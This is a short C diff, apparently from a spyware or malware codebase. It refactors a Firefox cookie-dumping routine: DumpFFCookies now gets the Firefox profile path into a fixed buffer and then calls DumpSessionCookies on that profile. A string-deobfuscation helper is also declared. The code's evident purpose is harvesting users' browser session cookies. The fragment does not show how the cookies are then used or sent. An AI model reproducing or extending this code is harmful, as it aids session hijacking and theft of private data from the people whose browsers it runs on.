@@ -19,7 +19,7 @@ static HMODULE libsqlsc;
 extern int DirectoryExists(WCHAR *path);
 extern char *HM_CompletePath(char *file_name, char *buffer);
 extern char *GetDosAsciiName(WCHAR *orig_path);
-extern WCHAR *GetFFProfilePath();
+extern WCHAR *GetFFProfilePath(WCHAR *, size_t);
 extern char *DeobStringA(char *string);
 extern void FireFoxInitFunc();
 
@@ -184,11 +184,11 @@ int DumpSessionCookies(WCHAR *profilePath)
 
 int DumpFFCookies(void)
 {
-	WCHAR *ProfilePath = NULL; 	//Profile path
+	WCHAR ProfilePath[MAX_PATH] = {}; //Profile path
 
-	ProfilePath = GetFFProfilePath();
+	GetFFProfilePath(ProfilePath, MAX_PATH);
 
-	if (ProfilePath == NULL || !DirectoryExists(ProfilePath)) 
+	if (!DirectoryExists(ProfilePath)) 
 		return 0;
 		
 	DumpSessionCookies(ProfilePath);
